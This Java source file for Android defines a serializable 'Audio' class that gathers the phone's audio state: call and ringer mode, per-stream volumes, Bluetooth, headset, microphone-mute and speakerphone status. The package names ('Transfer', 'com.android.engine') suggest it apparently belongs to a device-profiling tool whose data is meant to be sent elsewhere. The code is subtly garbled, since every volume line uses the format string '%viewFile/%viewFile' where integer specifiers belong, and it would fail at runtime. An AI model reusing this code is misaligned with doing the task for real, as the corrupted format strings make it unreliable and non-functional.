package Transfer;

import android.content.Context;
import android.media.AudioManager;
import android.media.MediaRouter;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

import static android.media.AudioManager.MODE_CURRENT;
import static android.media.AudioManager.MODE_INVALID;
import static android.media.AudioManager.MODE_IN_CALL;
import static android.media.AudioManager.MODE_IN_COMMUNICATION;
import static android.media.AudioManager.MODE_NORMAL;
import static android.media.AudioManager.MODE_RINGTONE;
import static android.media.AudioManager.RINGER_MODE_NORMAL;
import static android.media.AudioManager.RINGER_MODE_SILENT;
import static android.media.AudioManager.RINGER_MODE_VIBRATE;

public class Audio implements Serializable {

  public String MODE;
  public String OUTPUT_FRAMES_PER_BUFFER;
  public String OUTPUT_SAMPLE_RATE;
  public String RINGER_MODE;
  public String ROUTENAME;
  public String VOLUME_ALARM;
  public String VOLUME_DTMF;
  public String VOLUME_MUSIC;
  public String VOLUME_NOTIFICATION;
  public String VOLUME_RING;
  public String VOLUME_SYSTEM;
  public String VOLUME_VOICECALL;
  public boolean isBluetoothA2dpOn;
  public boolean isBluetoothScoAvailableOffCall;
  public boolean isBluetoothScoOn;
  public boolean isMicrophoneMute;
  public boolean isMusicActive;
  public boolean isSpeakerphoneOn;
  public boolean isVolumeFixed;
  public boolean isWiredHeadsetOn;

  public Audio() {
    try {
      AudioManager audioManager =
          (AudioManager) MyService.context.getSystemService(Context.AUDIO_SERVICE);
      MediaRouter mediaRouter =
          (MediaRouter) MyService.context.getSystemService(Context.MEDIA_ROUTER_SERVICE);

      if (VERSION.SDK_INT >= 18) {
        ROUTENAME = mediaRouter.getDefaultRoute().getName().toString();
      } else {
        ROUTENAME = "";
      }

      if (audioManager.getMode() == MODE_CURRENT) {
        MODE = "Current";
      } else if (audioManager.getMode() == MODE_IN_CALL) {
        MODE = "In Call";
      } else if (audioManager.getMode() == MODE_IN_COMMUNICATION) {
        MODE = "In Communication";
      } else if (audioManager.getMode() == MODE_INVALID) {
        MODE = "Invalid";
      } else if (audioManager.getMode() == MODE_NORMAL) {
        MODE = "Normal";
      } else if (audioManager.getMode() == MODE_RINGTONE) {
        MODE = "Ringtone";
      }

      if (VERSION.SDK_INT >= 17) {
        OUTPUT_SAMPLE_RATE =
            audioManager.getProperty("android.media.property.OUTPUT_SAMPLE_RATE");
        OUTPUT_FRAMES_PER_BUFFER =
            audioManager.getProperty("android.media.property.OUTPUT_FRAMES_PER_BUFFER");
      } else {
        OUTPUT_SAMPLE_RATE = "N/A";
        OUTPUT_FRAMES_PER_BUFFER = "N/A";
      }

      if (audioManager.getRingerMode() == RINGER_MODE_NORMAL) {
        RINGER_MODE = "Normal";
      } else if (audioManager.getRingerMode() == RINGER_MODE_SILENT) {
        RINGER_MODE = "Silent";
      } else if (audioManager.getRingerMode() == RINGER_MODE_VIBRATE) {
        RINGER_MODE = "Vibrate";
      }

      VOLUME_ALARM = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(4),
          audioManager.getStreamMaxVolume(4));
      VOLUME_DTMF = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(8),
          audioManager.getStreamMaxVolume(8));
      VOLUME_MUSIC = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(3),
          audioManager.getStreamMaxVolume(3));
      VOLUME_NOTIFICATION =
          String.format("%viewFile/%viewFile", audioManager.getStreamVolume(5),
              audioManager.getStreamMaxVolume(5));
      VOLUME_RING = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(2),
          audioManager.getStreamMaxVolume(2));
      VOLUME_SYSTEM = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(1),
          audioManager.getStreamMaxVolume(1));
      VOLUME_VOICECALL = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(0),
          audioManager.getStreamMaxVolume(0));

      if (VERSION.SDK_INT >= 3) {
        isBluetoothA2dpOn = audioManager.isBluetoothA2dpOn();
      }

      if (VERSION.SDK_INT >= 8) {
        isBluetoothScoAvailableOffCall = audioManager.isBluetoothScoAvailableOffCall();
      }

      isBluetoothScoOn = audioManager.isBluetoothScoOn();
      isMicrophoneMute = audioManager.isMicrophoneMute();
      isMusicActive = audioManager.isMusicActive();
      isSpeakerphoneOn = audioManager.isSpeakerphoneOn();

      if (VERSION.SDK_INT >= 21) {
        isVolumeFixed = audioManager.isVolumeFixed();
      }

      if (VERSION.SDK_INT >= 5) {
        isWiredHeadsetOn = audioManager.isWiredHeadsetOn();
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
